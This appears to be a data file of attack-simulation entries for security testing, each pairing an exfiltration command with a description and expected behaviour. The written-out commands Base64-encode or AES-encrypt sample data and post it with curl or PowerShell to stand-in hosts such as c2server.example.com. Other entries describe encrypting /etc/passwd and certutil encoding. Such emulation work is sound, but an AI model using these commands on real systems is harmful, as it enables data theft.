attacks.expected_behavior: Creates an encrypted version of the /etc/passwd file in /tmp, using a specified password for encryption.

attacks.description: This command demonstrates basic exfiltration by compressing a test file and then uploading it to a hypothetical C2 server using PowerShell.
attacks.expected_behavior: The command will create a zip archive of a test file in the temp directory and then attempt to upload this archive to a specified URL, simulating data exfiltration.

attacks.description: This command demonstrates an intermediate level of exfiltration by first encoding sensitive data using certutil and then uploading the encoded data to a C2 server.
attacks.expected_behavior: The command encodes a file containing sensitive data and then uploads this encoded file to a specified URL, simulating encoded data exfiltration.

attacks.command: powershell -Command "[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('This is a test string')) | Set-Content '%TEMP%\base64encoded.txt'; Invoke-WebRequest -Uri 'http://example.com/upload' -Method Post -InFile '%TEMP%\base64encoded.txt'"
attacks.description: This command demonstrates an advanced level of exfiltration by converting a string to Base64, saving it to a file, and then uploading this file to a C2 server.
attacks.expected_behavior: The command converts a test string to Base64, saves it to a file, and then uploads this file to a specified URL, simulating the exfiltration of encoded data.

attacks.command: echo 'sensitive_data' | base64 | curl -X POST -H 'Content-Type: text/plain' --data '@-' http://c2server.example.com/exfiltrate
attacks.description: Basic exfiltration using curl to transmit base64 encoded data
attacks.expected_behavior: The command encodes 'sensitive_data' with base64 and transmits it to a C2 server using curl.

attacks.description: Intermediate exfiltration using wget to transmit compressed and base64 encoded data
attacks.expected_behavior: The command compresses 'sensitive_data' with gzip, encodes it with base64, and transmits it to a C2 server using wget.

attacks.command: echo 'sensitive_data' | openssl enc -aes-256-cbc -a -A | curl -X POST -H 'Content-Type: text/plain' --data '@-' http://c2server.example.com/exfiltrate
attacks.description: Advanced exfiltration using openssl for AES encryption and curl for transmission
attacks.expected_behavior: The command encrypts 'sensitive_data' with AES-256-CBC using openssl, encodes it with base64, and transmits it to a C2 server using curl.
